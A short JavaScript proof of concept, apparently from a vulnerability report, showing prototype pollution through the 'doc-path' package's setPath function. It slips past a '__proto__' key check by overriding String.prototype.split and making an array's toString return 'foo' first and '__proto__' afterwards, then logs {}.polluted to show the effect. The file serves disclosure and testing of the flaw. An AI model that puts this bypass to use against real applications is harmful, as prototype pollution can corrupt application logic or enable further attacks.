var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const path = require('doc-path');
let obj = {};
console.log({}.polluted);
path.setPath({}, '__proto__.polluted', 'yes');
console.log({}.polluted);